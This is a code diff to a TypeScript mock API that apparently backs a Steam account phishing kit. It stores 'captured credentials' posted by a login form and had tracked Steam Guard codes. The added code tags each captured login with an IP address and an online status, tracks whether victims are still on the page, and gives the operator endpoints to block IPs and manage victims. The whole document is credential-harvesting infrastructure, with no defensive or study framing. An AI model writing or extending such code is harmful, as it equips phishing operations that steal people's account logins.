@@ -4,7 +4,13 @@
 // Store for captured credentials
 let capturedCredentials: any[] = [];
 let adminActions: Record<string, string> = {};
-let steamGuardCodes: Record<string, string> = {};
+let blockedIPs: string[] = []; // Store blocked IPs
+let activeUsers: Record<string, boolean> = {}; // Track online users
+
+// Mock IP addresses (in real world, this would be determined by the server)
+const generateMockIP = () => {
+  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+};
 
 // Mock API response handler
 const handleApiRequest = async (url: string, options: RequestInit = {}) => {
@@ -19,16 +25,29 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
     console.log("Storing credentials:", options.body);
     try {
       const data = JSON.parse(options.body as string);
+      const ip = generateMockIP(); // In a real app, this would be the client's IP
+      
       const newCredential = {
         ...data,
         id: Date.now().toString(),
         timestamp: new Date().toISOString(),
-        status: 'pending'
+        ip: ip,
+        status: 'pending',
+        online: true
       };
+      
+      // Check if IP is blocked
+      if (blockedIPs.includes(ip)) {
+        console.log("Blocked IP attempted login:", ip);
+        return { success: false, error: "IP blocked", blocked: true };
+      }
+      
       capturedCredentials.push(newCredential);
+      activeUsers[newCredential.id] = true; // Mark user as online
+      
       console.log("Credentials stored successfully:", newCredential);
       console.log("All credentials:", capturedCredentials);
-      return { success: true };
+      return { success: true, credential: newCredential };
     } catch (error) {
       console.error("Error storing credentials:", error);
       return { success: false, error: "Failed to parse credentials" };
@@ -96,6 +115,52 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
     return { success: true };
   }
   
+  if (endpoint === '/api/set-user-offline') {
+    const data = JSON.parse(options.body as string);
+    const userId = data.userId;
+    
+    if (userId && activeUsers[userId]) {
+      activeUsers[userId] = false;
+      
+      // Update online status in capturedCredentials
+      capturedCredentials = capturedCredentials.map(cred => {
+        if (cred.id === userId) {
+          return {
+            ...cred,
+            online: false
+          };
+        }
+        return cred;
+      });
+    }
+    
+    return { success: true };
+  }
+  
+  if (endpoint === '/api/block-ip') {
+    const data = JSON.parse(options.body as string);
+    const ip = data.ip;
+    
+    if (ip && !blockedIPs.includes(ip)) {
+      blockedIPs.push(ip);
+      console.log("IP blocked:", ip);
+      console.log("All blocked IPs:", blockedIPs);
+      
+      // Update status for all credentials with this IP
+      capturedCredentials = capturedCredentials.map(cred => {
+        if (cred.ip === ip) {
+          return {
+            ...cred,
+            status: 'blocked'
+          };
+        }
+        return cred;
+      });
+    }
+    
+    return { success: true, blockedIPs };
+  }
+  
   // Default fallback
   return { error: 'Endpoint not found' };
 };
@@ -132,12 +197,25 @@ window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
   return originalFetch(input, init);
 };
 
+// Handle user going offline
+window.addEventListener('beforeunload', () => {
+  // In a real app, we would send a request to the server to mark the user as offline
+  // Here we'll do it synchronously since we're about to unload the page
+  const userCredential = capturedCredentials.find(cred => activeUsers[cred.id]);
+  if (userCredential) {
+    activeUsers[userCredential.id] = false;
+    userCredential.online = false;
+  }
+});
+
 // Initialize the mock API
 export const initMockApi = () => {
   console.log('Mock API initialized');
   
   // Initialize with empty data
   capturedCredentials = [];
+  blockedIPs = [];
+  activeUsers = {};
 };
 
 export default {
